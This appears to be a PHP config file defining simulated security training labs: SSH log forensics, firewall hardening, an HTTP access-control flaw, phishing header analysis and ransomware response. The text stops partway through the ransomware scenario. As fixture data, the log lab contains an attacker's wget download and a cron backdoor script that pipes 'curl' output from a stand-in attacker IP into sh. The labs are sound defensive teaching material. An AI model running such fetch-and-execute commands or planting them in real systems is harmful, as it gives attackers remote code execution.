<?php

/*
 * Practical labs (ARCHITECTURE §7, D28), loaded by Labs\Services\LabLoader. Keyed by slug, in
 * the order offered. Each names a server-side engine and a scenario; checkpoint answers and
 * hidden test packets stay on the server. Engines and scenario formats:
 * app/Modules/Labs/Engines. Everything here is simulated: no command runs and no request
 * leaves the server.
 */

// An overnight SSH brute force against web-01, then a login and a scheduled backdoor.
$auth = [];
$second = 0;
$time = function () use (&$second): string {
    $t = 2 * 3600 + 41 * 60 + $second;

    return sprintf('Nov 20 %02d:%02d:%02d', intdiv($t, 3600), intdiv($t, 60) % 60, $t % 60);
};
foreach (['admin', 'root', 'test', 'oracle', 'admin', 'ubuntu', 'deploy', 'root', 'git', 'deploy', 'admin', 'postgres', 'deploy', 'root', 'test', 'deploy', 'jenkins', 'admin', 'deploy', 'root', 'ftp', 'deploy', 'admin', 'deploy'] as $i => $user) {
    $second += 37;
    $known = in_array($user, ['root', 'deploy'], true);
    $auth[] = $time().' web-01 sshd['.(2301 + $i).']: Failed password for '.($known ? '' : 'invalid user ').$user.' from 203.0.113.77 port '.(40112 + $i * 3).' ssh2';
    if ($i === 9) {
        $auth[] = $time().' web-01 sshd[2330]: Failed password for mai from 198.51.100.23 port 52011 ssh2';
        $auth[] = $time().' web-01 sshd[2331]: Accepted password for mai from 198.51.100.23 port 52014 ssh2';
    }
}
$second += 41;
$auth[] = $time().' web-01 sshd[2412]: Accepted password for deploy from 203.0.113.77 port 51544 ssh2';
$second += 12;
$auth[] = $time().' web-01 sshd[2412]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)';
$second += 95;
$auth[] = $time().' web-01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/crontab -e';
$second += 240;
$auth[] = $time().' web-01 sshd[2412]: pam_unix(sshd:session): session closed for user deploy';

return [
    'investigate-a-suspicious-login' => [
        'title' => 'Investigate a suspicious login',
        'summary' => 'Read a server\'s logs from the shell to find who broke in overnight, from where, and what they left behind.',
        'briefing' => <<<'MD'
The web team noticed a burst of failed SSH logins on **web-01** overnight, followed by one that succeeded. You have a read-only shell on the server. Work out who got in, from where, and what they changed.

Start with `cat notes.txt`. The commands you know from the lesson work here: `ls`, `cd`, `cat`, `grep`, `wc`, `sort`, `uniq`, `cut`, `head`, `tail` and `find`, and `|` passes one command's output to the next. Type `help` for the full list.

Everything here is simulated: nothing you type runs on a real system.
MD,
        'domain' => 'linux',
        'lesson' => 'linux-logs',
        'engine' => 'linux-shell',
        'difficulty' => 1,
        'estimated_minutes' => 25,
        'solutions' => [
            'solutions' => [
                ['name' => 'Read the log, then answer', 'actions' => [
                    ['type' => 'command', 'command' => 'cat notes.txt'],
                    ['type' => 'command', 'command' => 'cat /var/log/auth.log'],
                    ['type' => 'command', 'command' => 'grep Accepted /var/log/auth.log'],
                    ['type' => 'command', 'command' => 'grep 203.0.113.77 /var/log/auth.log | grep -c Failed'],
                    ['type' => 'command', 'command' => 'cat /var/log/syslog'],
                    ['type' => 'answer', 'checkpoint' => 'attacker-ip', 'value' => '203.0.113.77'],
                    ['type' => 'answer', 'checkpoint' => 'account', 'value' => 'deploy'],
                    ['type' => 'answer', 'checkpoint' => 'failure-count', 'value' => '24'],
                    ['type' => 'answer', 'checkpoint' => 'backdoor', 'value' => '/tmp/.cache/update.sh'],
                ]],
            ],
            'decoys' => [
                ['name' => 'Answer without opening the log', 'actions' => [
                    ['type' => 'answer', 'checkpoint' => 'attacker-ip', 'value' => '203.0.113.77'],
                    ['type' => 'answer', 'checkpoint' => 'account', 'value' => 'deploy'],
                    ['type' => 'answer', 'checkpoint' => 'failure-count', 'value' => '24'],
                    ['type' => 'answer', 'checkpoint' => 'backdoor', 'value' => '/tmp/.cache/update.sh'],
                ]],
            ],
        ],
        'scenario' => [
            'hostname' => 'web-01',
            'user' => 'analyst',
            'home' => '/home/analyst',
            'cwd' => '/home/analyst',
            'files' => [
                '/home/analyst/notes.txt' => "Ticket SEC-142\nA burst of failed SSH logins hit web-01 overnight, then one succeeded.\nFind out who got in, from where, and what they did.\nThe logs are under /var/log.\n",
                '/var/log/auth.log' => implode("\n", $auth)."\n",
                '/var/log/syslog' => implode("\n", [
                    'Nov 20 02:30:01 web-01 CRON[2201]: (root) CMD (/usr/lib/php/sessionclean)',
                    'Nov 20 02:58:31 web-01 crontab[2420]: (root) REPLACE (root)',
                    'Nov 20 03:00:01 web-01 CRON[2431]: (root) CMD (/usr/lib/php/sessionclean)',
                    'Nov 20 03:00:01 web-01 CRON[2432]: (root) CMD (/tmp/.cache/update.sh)',
                    'Nov 20 03:05:01 web-01 CRON[2447]: (root) CMD (/tmp/.cache/update.sh)',
                    'Nov 20 03:10:01 web-01 CRON[2459]: (root) CMD (/tmp/.cache/update.sh)',
                ])."\n",
                '/home/deploy/.bash_history' => "ls -la\nwget http://203.0.113.77/update.sh -O /tmp/.cache/update.sh\nchmod +x /tmp/.cache/update.sh\nsudo crontab -e\nhistory -c\n",
                '/tmp/.cache/update.sh' => "#!/bin/sh\n# runs every five minutes from root's crontab\ncurl -s http://203.0.113.77/task | sh\n",
                '/etc/hostname' => "web-01\n",
                '/etc/passwd' => "root:x:0:0:root:/root:/bin/bash\ndeploy:x:1001:1001:Deploy user:/home/deploy:/bin/bash\nmai:x:1002:1002:Mai Nguyen:/home/mai:/bin/bash\nanalyst:x:1000:1000:Analyst:/home/analyst:/bin/bash\n",
            ],
            'dirs' => ['/home/mai', '/root'],
            'checkpoints' => [
                ['id' => 'read-auth-log', 'kind' => 'read', 'path' => '/var/log/auth.log', 'title' => 'Open the authentication log, /var/log/auth.log.', 'hint' => 'Try cd /var/log, then ls, then cat or head on the file.'],
                ['id' => 'attacker-ip', 'kind' => 'answer', 'answers' => ['203.0.113.77'], 'title' => 'Which IP address made the failed attempts and then logged in?', 'hint' => 'grep "Accepted" shows every successful login. Which source also appears in the failures?'],
                ['id' => 'account', 'kind' => 'answer', 'answers' => ['deploy'], 'title' => 'Which account did the attacker log in as?', 'hint' => 'Read the "Accepted password for …" line for that address.'],
                ['id' => 'failure-count', 'kind' => 'answer', 'answers' => ['24'], 'title' => 'How many failed password attempts came from that address?', 'hint' => 'Chain two filters: grep the address, pipe into grep -c "Failed password".'],
                ['id' => 'backdoor', 'kind' => 'answer', 'answers' => ['/tmp/.cache/update.sh'], 'title' => 'Which file did the attacker schedule to run? Give its full path.', 'hint' => 'The attacker edited root\'s crontab. Look for what CRON started afterwards in /var/log/syslog.'],
            ],
        ],
    ],

    'lock-down-a-web-server' => [
        'title' => 'Lock down a web server\'s firewall',
        'summary' => 'Turn a permissive rule list into one that serves the website, keeps SSH for admins only and refuses everything else.',
        'briefing' => <<<'MD'
**web-01** (10.0.20.10) runs the public website. Its firewall allows far too much: anyone can reach SSH, and everything not listed is allowed by default.

Rewrite the rules so the server does its job and nothing more. Rules are checked from the top; the first rule that matches a packet decides, and the default policy handles anything no rule matches. Use **Test a packet** to check your rules before you rely on them. The admin network is 10.0.10.0/24.

Everything here is simulated: no traffic is sent anywhere.
MD,
        'domain' => 'system-administration',
        'lesson' => 'hardening-basics',
        'engine' => 'firewall-rules',
        'difficulty' => 2,
        'estimated_minutes' => 20,
        'solutions' => [
            'solutions' => [
                ['name' => 'Default deny, then allow what is needed', 'actions' => [
                    ['type' => 'set_default', 'policy' => 'deny'],
                    ['type' => 'remove_rule', 'index' => 0],
                    ['type' => 'add_rule', 'rule' => ['action' => 'allow', 'proto' => 'tcp', 'port' => 443, 'source' => 'any']],
                    ['type' => 'add_rule', 'rule' => ['action' => 'allow', 'proto' => 'tcp', 'port' => 22, 'source' => '10.0.10.0/24']],
                    ['type' => 'answer', 'checkpoint' => 'default-policy', 'value' => 'deny'],
                ]],
                ['name' => 'Keep default allow, finish with a deny-all rule', 'actions' => [
                    ['type' => 'remove_rule', 'index' => 0],
                    ['type' => 'add_rule', 'rule' => ['action' => 'allow', 'proto' => 'tcp', 'port' => 443, 'source' => 'any']],
                    ['type' => 'add_rule', 'rule' => ['action' => 'allow', 'proto' => 'tcp', 'port' => 22, 'source' => '10.0.10.0/24']],
                    ['type' => 'add_rule', 'rule' => ['action' => 'deny', 'proto' => 'any', 'source' => 'any']],
                    ['type' => 'answer', 'checkpoint' => 'default-policy', 'value' => 'deny'],
                ]],
            ],
            'decoys' => [
                ['name' => 'Deny by default and forget HTTPS and SSH for admins', 'actions' => [
                    ['type' => 'set_default', 'policy' => 'deny'],
                    ['type' => 'answer', 'checkpoint' => 'default-policy', 'value' => 'deny'],
                ]],
            ],
        ],
        'scenario' => [
            'server' => ['name' => 'web-01', 'ip' => '10.0.20.10'],
            'default' => 'allow',
            'rules' => [
                ['action' => 'allow', 'proto' => 'tcp', 'port' => 22, 'source' => 'any'],
                ['action' => 'allow', 'proto' => 'tcp', 'port' => 80, 'source' => 'any'],
            ],
            'checkpoints' => [
                ['id' => 'https-open', 'kind' => 'traffic', 'title' => 'Visitors anywhere can reach the website over HTTPS (TCP 443).', 'packets' => [
                    ['proto' => 'tcp', 'port' => 443, 'source' => '198.51.100.7', 'expect' => 'allow'],
                    ['proto' => 'tcp', 'port' => 443, 'source' => '10.0.10.25', 'expect' => 'allow'],
                ]],
                ['id' => 'http-redirect', 'kind' => 'traffic', 'title' => 'Plain HTTP (TCP 80) still answers, so it can send visitors to HTTPS.', 'packets' => [
                    ['proto' => 'tcp', 'port' => 80, 'source' => '203.0.113.9', 'expect' => 'allow'],
                ]],
                ['id' => 'ssh-admins-only', 'kind' => 'traffic', 'title' => 'SSH (TCP 22) works from the admin network 10.0.10.0/24 and nowhere else.', 'hint' => 'An allow rule for the admin network has to come before anything that would refuse SSH.', 'packets' => [
                    ['proto' => 'tcp', 'port' => 22, 'source' => '10.0.10.25', 'expect' => 'allow'],
                    ['proto' => 'tcp', 'port' => 22, 'source' => '203.0.113.50', 'expect' => 'deny'],
                    ['proto' => 'tcp', 'port' => 22, 'source' => '10.0.20.30', 'expect' => 'deny'],
                ]],
                ['id' => 'rest-refused', 'kind' => 'traffic', 'title' => 'Everything else is refused, including the database port and services on the admin network.', 'hint' => 'Think about what happens to a packet that no rule matches.', 'packets' => [
                    ['proto' => 'tcp', 'port' => 3306, 'source' => '203.0.113.9', 'expect' => 'deny'],
                    ['proto' => 'udp', 'port' => 161, 'source' => '10.0.10.25', 'expect' => 'deny'],
                    ['proto' => 'tcp', 'port' => 8080, 'source' => '10.0.10.25', 'expect' => 'deny'],
                ]],
                ['id' => 'default-policy', 'kind' => 'answer', 'answers' => ['deny', 'default deny', 'deny all', 'block', 'drop'], 'title' => 'In one word: what default policy should a server\'s inbound firewall use?'],
            ],
        ],
    ],

    'inspect-a-shop-session' => [
        'title' => 'Inspect an online shop\'s session',
        'summary' => 'Read recorded HTTP traffic, spot what the responses give away, and replay a request to find a broken access check.',
        'briefing' => <<<'MD'
You have an account at **Mini Shop**, a small online store, and you are allowed to test it. Below are the requests your browser made when you signed in and opened your order. Read the headers, then send your own requests with your session cookie and see how the shop answers.

Everything here is simulated: requests go to a practice copy of the shop inside this lab, never to the internet. Only ever test sites you have permission to test.
MD,
        'domain' => 'web-security',
        'lesson' => 'http-essentials',
        'engine' => 'http-inspector',
        'difficulty' => 2,
        'estimated_minutes' => 25,
        'solutions' => [
            'solutions' => [
                ['name' => 'Read the exchanges, then try the next order number', 'actions' => [
                    ['type' => 'send', 'request' => ['method' => 'GET', 'path' => '/api/orders/1001', 'cookies' => ['session' => 'u-4821-7f3a9c']]],
                    ['type' => 'send', 'request' => ['method' => 'GET', 'path' => '/api/orders/1002', 'cookies' => ['session' => 'u-4821-7f3a9c']]],
                    ['type' => 'answer', 'checkpoint' => 'missing-flag', 'value' => 'HttpOnly'],
                    ['type' => 'answer', 'checkpoint' => 'server-version', 'value' => 'Apache/2.4.49'],
                    ['type' => 'answer', 'checkpoint' => 'whose-order', 'value' => 'minh.tran@shop.example'],
                ]],
            ],
            'decoys' => [
                ['name' => 'Only look at your own order', 'actions' => [
                    ['type' => 'send', 'request' => ['method' => 'GET', 'path' => '/api/orders/1001', 'cookies' => ['session' => 'u-4821-7f3a9c']]],
                    ['type' => 'answer', 'checkpoint' => 'missing-flag', 'value' => 'HttpOnly'],
                    ['type' => 'answer', 'checkpoint' => 'server-version', 'value' => 'Apache/2.4.49'],
                ]],
            ],
        ],
        'scenario' => [
            'app' => ['name' => 'Mini Shop', 'origin' => 'https://shop.example'],
            'session' => ['name' => 'session', 'value' => 'u-4821-7f3a9c'],
            'captured' => [
                [
                    'request' => ['method' => 'POST', 'path' => '/login', 'headers' => ['Content-Type' => 'application/x-www-form-urlencoded'], 'body' => 'email=you%40shop.example&password=********'],
                    'response' => ['status' => 302, 'headers' => ['Server' => 'Apache/2.4.49 (Unix)', 'Location' => '/account', 'Set-Cookie' => 'session=u-4821-7f3a9c; Path=/; Secure; SameSite=Lax'], 'body' => ''],
                ],
                [
                    'request' => ['method' => 'GET', 'path' => '/api/orders/1001', 'headers' => ['Cookie' => 'session=u-4821-7f3a9c', 'Accept' => 'application/json'], 'body' => ''],
                    'response' => ['status' => 200, 'headers' => ['Server' => 'Apache/2.4.49 (Unix)', 'Content-Type' => 'application/json'], 'body' => '{"id":1001,"customer":"you@shop.example","total":"24.90","items":["USB-C cable","Laptop stand"]}'],
                ],
            ],
            'routes' => [
                ['id' => 'own-order', 'method' => 'GET', 'path' => '/api/orders/1001', 'cookie' => ['name' => 'session', 'value' => 'u-4821-7f3a9c'],
                    'response' => ['status' => 200, 'headers' => ['Content-Type' => 'application/json'], 'body' => '{"id":1001,"customer":"you@shop.example","total":"24.90","items":["USB-C cable","Laptop stand"]}']],
                ['id' => 'order-1002', 'method' => 'GET', 'path' => '/api/orders/1002', 'cookie' => ['name' => 'session', 'value' => 'u-4821-7f3a9c'],
                    'response' => ['status' => 200, 'headers' => ['Content-Type' => 'application/json'], 'body' => '{"id":1002,"customer":"minh.tran@shop.example","total":"310.00","address":"12 Le Loi, District 1","items":["Mechanical keyboard","27-inch monitor"]}']],
                ['id' => 'order-1003', 'method' => 'GET', 'path' => '/api/orders/1003', 'cookie' => ['name' => 'session', 'value' => 'u-4821-7f3a9c'],
                    'response' => ['status' => 200, 'headers' => ['Content-Type' => 'application/json'], 'body' => '{"id":1003,"customer":"thao.le@shop.example","total":"58.40","items":["Webcam"]}']],
                ['id' => 'my-orders', 'method' => 'GET', 'path' => '/api/orders', 'cookie' => ['name' => 'session', 'value' => 'u-4821-7f3a9c'],
                    'response' => ['status' => 200, 'headers' => ['Content-Type' => 'application/json'], 'body' => '[{"id":1001,"total":"24.90"}]']],
                ['id' => 'account', 'method' => 'GET', 'path' => '/account', 'cookie' => ['name' => 'session', 'value' => 'u-4821-7f3a9c'],
                    'response' => ['status' => 200, 'headers' => ['Content-Type' => 'text/html'], 'body' => '<h1>Your account</h1><p>Signed in as you@shop.example</p>']],
                ['id' => 'admin', 'method' => 'GET', 'path' => '/admin',
                    'response' => ['status' => 403, 'headers' => ['Content-Type' => 'text/plain'], 'body' => 'Forbidden']],
            ],
            'checkpoints' => [
                ['id' => 'missing-flag', 'kind' => 'answer', 'answers' => ['HttpOnly', 'Http-Only', 'Http Only'], 'title' => 'Which attribute is missing from the session cookie, so scripts on the page could read it?', 'hint' => 'Compare the Set-Cookie header on the login response with the cookie attributes from the lesson.'],
                ['id' => 'server-version', 'kind' => 'answer', 'answers' => ['Apache/2.4.49', 'Apache 2.4.49', 'Apache/2.4.49 (Unix)', '2.4.49'], 'title' => 'Which web server software and version does the shop reveal in its responses?'],
                ['id' => 'other-order', 'kind' => 'request', 'route' => 'order-1002', 'title' => 'With your own session, fetch an order that is not yours.', 'hint' => 'Your order is /api/orders/1001. What does the shop do if you change the number?'],
                ['id' => 'whose-order', 'kind' => 'answer', 'answers' => ['minh.tran@shop.example'], 'title' => 'Whose order is 1002? Give the customer\'s email address.'],
            ],
            'not_found' => ['status' => 404, 'headers' => ['Content-Type' => 'text/plain'], 'body' => 'Not Found'],
        ],
    ],

    // Invented names and reserved domains only (example.com, example.net, .test): nothing here is a real company.
    // Technical evidence only (owner content rule, D80): authentication results, headers, links, attachments and logs.
    'spot-the-phishing-email' => [
        'title' => 'Trace a forged email',
        'summary' => 'Read a reported message\'s raw headers, what the mail client displays and the mail server\'s log, mark the technical evidence, and give a verdict and a response.',
        'briefing' => <<<'MD'
A message reached a mailbox at **corp.test** and was reported. You are on the mail-security team: decide from the technical evidence whether the sender is who the `From` line says, and what to block.

You have three pieces of evidence: the **raw message** and **what the mail client displays** (two views of the same message), and the **mail server's log** from when it arrived. Everything is plain text. Nothing in it is a working link, and nothing is loaded or run.

1. Mark the lines that are evidence: authentication results, header mismatches, where a link really goes, what an attachment really is. Click a line, or move to it with the arrow keys and press Space or Enter. Each piece of evidence has a limit on marks, and marking everything will not pass.
2. Give your verdict and the response, and cite the evidence you marked.

All names, addresses and domains here are invented.
MD,
        'domain' => 'security-fundamentals',
        'lesson' => null,
        'engine' => 'evidence-review',
        'difficulty' => 1,
        'estimated_minutes' => 15,
        'scenario' => [
            'artifacts' => [
                [
                    'id' => 'message',
                    'title' => 'The message',
                    'max_marks' => 12,
                    'views' => [
                        ['id' => 'raw', 'label' => 'Raw message', 'lines' => [
                            'Return-Path: <bounce@accounts-verify.example.net>',
                            'Received: from mail-gw.example.net (mail-gw.example.net [198.51.100.45]) by mx.corp.test with ESMTP; Wed, 18 Nov 2026 03:12:03 +0000',
                            'Received: from [10.14.2.7] (unknown [192.0.2.80]) by mail-gw.example.net with ESMTPSA; Wed, 18 Nov 2026 03:11:52 +0000',
                            'Authentication-Results: mx.corp.test; spf=pass smtp.mailfrom=accounts-verify.example.net; dkim=none; dmarc=fail header.from=larkfield.example',
                            'From: "Larkfield Savings Support" <support@larkfield.example>',
                            'Reply-To: <recover-account@larkfield-secure.example.net>',
                            'To: <a.nguyen@corp.test>',
                            'Subject: Statement available',
                            'Date: Wed, 18 Nov 2026 03:11:52 +0000',
                            'Message-ID: <7f3c19a2@mail-gw.example.net>',
                            'X-Mailer: BulkSend 2.1',
                            'MIME-Version: 1.0',
                            'Content-Type: multipart/mixed; boundary="b1"',
                            '--b1',
                            'Content-Type: text/html; name="statement-4821.pdf.html"',
                            'Content-Disposition: attachment; filename="statement-4821.pdf.html"',
                        ]],
                        ['id' => 'client', 'label' => 'What the mail client displays', 'lines' => [
                            'Display name: Larkfield Savings Support',
                            'Address: support@larkfield.example',
                            'Attachment: statement-4821.pdf.html (shown with a PDF icon)',
                            'Link text: www.larkfield.example/statements',
                            'Link target: https://larkfield-secure.example.net/statements?id=a81f3c',
                            'Footer: Larkfield Savings Customer Care',
                        ]],
                    ],
                ],
                [
                    'id' => 'mail-log',
                    'title' => 'Mail server log',
                    'max_marks' => 6,
                    'views' => [
                        ['id' => 'log', 'label' => 'mx.corp.test, 03:11 to 03:12', 'lines' => [
                            '03:11:58 mx postfix/smtpd[411]: connect from mail-gw.example.net[198.51.100.45]',
                            '03:11:59 mx opendmarc[412]: 4F2A1: larkfield.example fail (SPF not aligned, no DKIM), policy none',
                            '03:12:00 mx postfix/smtpd[411]: 4F2A1: client=mail-gw.example.net[198.51.100.45]',
                            '03:12:01 mx postfix/cleanup[415]: 4F2A1: message-id=<7f3c19a2@mail-gw.example.net>',
                            '03:12:01 mx rspamd[420]: 4F2A1: score=4.9 (threshold 8.0, not rejected), symbols: DMARC_POLICY_NONE_FAIL, NO_DKIM, DOUBLE_EXT_ATTACHMENT',
                            '03:12:02 mx postfix/qmgr[416]: 4F2A1: from=<bounce@accounts-verify.example.net>, size=5128, nrcpt=1',
                            '03:12:03 mx postfix/local[418]: 4F2A1: to=<a.nguyen@corp.test>, status=sent (delivered to mailbox)',
                            '03:12:04 mx postfix/smtpd[411]: disconnect from mail-gw.example.net[198.51.100.45]',
                        ]],
                    ],
                ],
            ],
            'indicators' => [
                ['id' => 'dmarc-fail', 'title' => 'DMARC fails on alignment', 'explanation' => 'SPF passed, but for accounts-verify.example.net, the Return-Path domain, not for larkfield.example in the From header. With no DKIM signature, neither mechanism aligns with the From domain, so DMARC fails. The log records the failure, but the policy for this check is none, so the message was still accepted.',
                    'lines' => [['artifact' => 'message', 'view' => 'raw', 'line' => 4], ['artifact' => 'mail-log', 'view' => 'log', 'line' => 2]]],
                ['id' => 'reply-to-differs', 'title' => 'Reply-To is a look-alike domain', 'explanation' => 'Replies would go to larkfield-secure.example.net, a look-alike of the From domain larkfield.example. A Reply-To on a different domain than From is a common sign of a forged header.',
                    'lines' => [['artifact' => 'message', 'view' => 'raw', 'line' => 6]]],
                ['id' => 'link-target', 'title' => 'The link text and the link target differ', 'explanation' => 'The client shows the link text www.larkfield.example/statements, but the href points at larkfield-secure.example.net. The domain in the href decides where the request goes, whatever the text says.',
                    'lines' => [['artifact' => 'message', 'view' => 'client', 'line' => 5], ['artifact' => 'message', 'view' => 'client', 'line' => 4]]],
                ['id' => 'attachment-name', 'title' => 'The attachment has a double extension', 'explanation' => 'statement-4821.pdf.html ends in .html: the declared type is text/html, which a browser opens and runs, although the client draws a PDF icon. Check the real extension and the declared Content-Type, not the icon.',
                    'lines' => [['artifact' => 'message', 'view' => 'raw', 'line' => 15], ['artifact' => 'message', 'view' => 'raw', 'line' => 16], ['artifact' => 'message', 'view' => 'client', 'line' => 3]]],
                ['id' => 'origin-host', 'title' => 'The first hop is an unrelated client address (a bonus find)', 'explanation' => 'The earliest Received header shows the message entering mail-gw.example.net from 192.0.2.80 over an authenticated submission, an address with no link to larkfield.example. Only the hop your own server recorded (198.51.100.45) is trustworthy, and it is not that domain\'s mail host either.',
                    'lines' => [['artifact' => 'message', 'view' => 'raw', 'line' => 3]]],
                ['id' => 'delivered-anyway', 'title' => 'The filter scored it below the threshold and delivered it (a bonus find)', 'explanation' => 'rspamd flagged DMARC_POLICY_NONE_FAIL, NO_DKIM and DOUBLE_EXT_ATTACHMENT, but the score of 4.9 was under the threshold of 8.0, so the message was delivered. A response is to raise the weight of these symbols or to reject on a DMARC fail for this domain.',
                    'lines' => [['artifact' => 'mail-log', 'view' => 'log', 'line' => 5], ['artifact' => 'mail-log', 'view' => 'log', 'line' => 7]]],
            ],
            'checkpoints' => [
                ['id' => 'mark-evidence', 'kind' => 'findings', 'title' => 'Mark the lines that show the sender is not who the From line says.', 'hint' => 'Look at the authentication results, a header that disagrees with From, where the link really goes, and what the attachment really is.', 'indicators' => ['dmarc-fail', 'reply-to-differs', 'link-target', 'attachment-name']],
                ['id' => 'real-domain', 'kind' => 'answer', 'answers' => ['larkfield-secure.example.net'], 'title' => 'Which domain does the link really point to?', 'hint' => 'Read the link target, not the link text.'],
                [
                    'id' => 'verdict',
                    'kind' => 'conclusion',
                    'title' => 'Give your verdict and response, and cite the evidence behind it.',
                    'question' => 'What is the verdict, and what do you do?',
                    'options' => [
                        ['id' => 'allow-list', 'text' => 'Legitimate bulk mail: allow-list the sending IP address'],
                        ['id' => 'spoofed-sender', 'text' => 'Spoofed sender: block the look-alike domains and the sending host, quarantine matching messages'],
                        ['id' => 'fix-spf', 'text' => 'A real sender with a broken record: ask them to add the host to their SPF record'],
                        ['id' => 'compromised', 'text' => 'A compromised mailbox at larkfield.example: have its password reset'],
                    ],
                    'answer' => 'spoofed-sender',
                    'evidence' => ['message:raw:4', 'message:raw:6', 'message:client:5', 'message:raw:15', 'mail-log:log:2'],
                    'min_cited' => 2,
                    'max_cited' => 4,
                    'explanation' => 'The sender cannot be authenticated as larkfield.example: DMARC fails on alignment, the Reply-To and the link target are on a look-alike domain, and the attachment is HTML named as a PDF. That is a spoofed sender, not a broken record or a compromised mailbox (the mail did not come from that domain\'s hosts). Block accounts-verify.example.net, larkfield-secure.example.net and 198.51.100.45 at the gateway, and quarantine matching messages.',
                ],
            ],
        ],
        'solutions' => [
            'solutions' => [
                ['name' => 'Mark the four required signs, then conclude', 'actions' => [
                    ['type' => 'mark', 'artifact' => 'message', 'view' => 'raw', 'line' => 4, 'on' => true],
                    ['type' => 'mark', 'artifact' => 'message', 'view' => 'raw', 'line' => 6, 'on' => true],
                    ['type' => 'mark', 'artifact' => 'message', 'view' => 'client', 'line' => 5, 'on' => true],
                    ['type' => 'mark', 'artifact' => 'message', 'view' => 'raw', 'line' => 15, 'on' => true],
                    ['type' => 'answer', 'checkpoint' => 'real-domain', 'value' => 'larkfield-secure.example.net'],
                    ['type' => 'conclude', 'checkpoint' => 'verdict', 'option' => 'spoofed-sender', 'cited' => ['message:raw:4', 'message:raw:6', 'message:client:5']],
                ]],
                ['name' => 'Use the log and the client view', 'actions' => [
                    ['type' => 'mark', 'artifact' => 'mail-log', 'view' => 'log', 'line' => 2, 'on' => true],
                    ['type' => 'mark', 'artifact' => 'message', 'view' => 'raw', 'line' => 6, 'on' => true],
                    ['type' => 'mark', 'artifact' => 'message', 'view' => 'client', 'line' => 4, 'on' => true],
                    ['type' => 'mark', 'artifact' => 'message', 'view' => 'client', 'line' => 3, 'on' => true],
                    ['type' => 'answer', 'checkpoint' => 'real-domain', 'value' => 'larkfield-secure.example.net'],
                    ['type' => 'conclude', 'checkpoint' => 'verdict', 'option' => 'spoofed-sender', 'cited' => ['mail-log:log:2', 'message:raw:6']],
                ]],
            ],
            'decoys' => [
                // Marking every line is not a review: the cap per artifact refuses it.
                ['name' => 'Mark every line', 'actions' => array_merge(
                    array_map(fn (int $n) => ['type' => 'mark', 'artifact' => 'message', 'view' => 'raw', 'line' => $n, 'on' => true], range(1, 16)),
                    array_map(fn (int $n) => ['type' => 'mark', 'artifact' => 'message', 'view' => 'client', 'line' => $n, 'on' => true], range(1, 6)),
                    array_map(fn (int $n) => ['type' => 'mark', 'artifact' => 'mail-log', 'view' => 'log', 'line' => $n, 'on' => true], range(1, 8)),
                    [
                        ['type' => 'answer', 'checkpoint' => 'real-domain', 'value' => 'larkfield-secure.example.net'],
                        ['type' => 'conclude', 'checkpoint' => 'verdict', 'option' => 'spoofed-sender', 'cited' => ['message:raw:4', 'message:raw:6']],
                    ],
                )],
                // The right verdict, backed by headers that prove nothing.
                ['name' => 'Mark the headers that prove nothing', 'actions' => [
                    ['type' => 'mark', 'artifact' => 'message', 'view' => 'raw', 'line' => 11, 'on' => true],
                    ['type' => 'mark', 'artifact' => 'message', 'view' => 'raw', 'line' => 8, 'on' => true],
                    ['type' => 'mark', 'artifact' => 'message', 'view' => 'client', 'line' => 6, 'on' => true],
                    ['type' => 'answer', 'checkpoint' => 'real-domain', 'value' => 'larkfield-secure.example.net'],
                    ['type' => 'conclude', 'checkpoint' => 'verdict', 'option' => 'spoofed-sender', 'cited' => ['message:raw:8', 'message:client:6']],
                ]],
            ],
        ],
    ],
    // Invented company and hosts, documentation addresses, nothing real. Technical actions only (owner content rule, D80).
    'contain-a-ransomware-incident' => [
        'title' => 'Contain a ransomware incident',
        'summary' => 'Ransomware is encrypting a file server. Choose the technical response: isolate, capture, stop, revoke, rotate and restore, in an order that keeps the evidence and the recovery.',
        'briefing' => <<<'MD'
At 03:40 the backup server reports files on **fs-01**, the file server of a small company (Brightwater Logistics), being renamed to `.locked` at about 200 a minute. The EDR shows an open TLS connection from fs-01 to `203.0.113.50:443`, and the encryptor was started by the service account `svc-backup` over SMB from the workstation `10.0.5.77`. The on-call manager has been paged.

You are the responder. Each decision is a technical action. After it you see what changed in the **incident state** and what the attacker does next. Several orders can finish the lab; some choices make a task impossible, and the lab tells you plainly when that happens and lets you start over.

1. Contain the incident, keep the evidence, and recover the shares from a clean backup.
2. Give your verdict on what the permanent fix should address, and cite the state that supports it.

Everything is simulated, and all names and addresses are invented.
MD,
        'domain' => 'security-fundamentals',
        'lesson' => null,
        'engine' => 'incident-response',
        'difficulty' => 2,
        'estimated_minutes' => 20,
        'scenario' => [
            'variables' => [
                ['id' => 'network', 'label' => 'fs-01 network', 'initial' => 'connected', 'values' => [['id' => 'connected', 'label' => 'Connected'], ['id' => 'isolated', 'label' => 'Isolated']]],
                ['id' => 'encryption', 'label' => 'Encrypting process', 'initial' => 'running', 'values' => [['id' => 'running', 'label' => 'Running'], ['id' => 'stopped', 'label' => 'Stopped']]],
                ['id' => 'evidence', 'label' => 'Volatile evidence', 'initial' => 'at-risk', 'values' => [['id' => 'at-risk', 'label' => 'At risk'], ['id' => 'preserved', 'label' => 'Preserved'], ['id' => 'lost', 'label' => 'Lost']]],
                ['id' => 'access', 'label' => 'Attacker\'s sessions', 'initial' => 'active', 'values' => [['id' => 'active', 'label' => 'Active'], ['id' => 'revoked', 'label' => 'Revoked']]],
                ['id' => 'credentials', 'label' => 'svc-backup credentials', 'initial' => 'compromised', 'values' => [['id' => 'compromised', 'label' => 'Compromised'], ['id' => 'rotated', 'label' => 'Rotated']]],
                ['id' => 'shares', 'label' => 'File shares', 'initial' => 'up', 'values' => [['id' => 'up', 'label' => 'Up, being encrypted'], ['id' => 'down', 'label' => 'Down'], ['id' => 'restored', 'label' => 'Restored from backup']]],
            ],
            'start' => 'respond',
            'nodes' => [
                [
                    'id' => 'respond',
                    'event' => '03:40. Files on fs-01 are being renamed to .locked at about 200 a minute. The EDR shows a TLS connection from fs-01 to 203.0.113.50:443 and the encryptor started by svc-backup over SMB from 10.0.5.77. The on-call manager has been paged.',
                    'choices' => [
                        [
                            'id' => 'capture-live',
                            'label' => 'Capture a memory image and the open-connection table from the running fs-01',
                            'requires' => [['evidence' => 'at-risk']],
                            'effects' => ['evidence' => 'preserved'],
                            'consequence' => 'The image and the connection table are copied to the forensic share.',
                            'attacker' => 'While the capture runs (six minutes) the encryptor keeps working and the outbound connection stays open.',
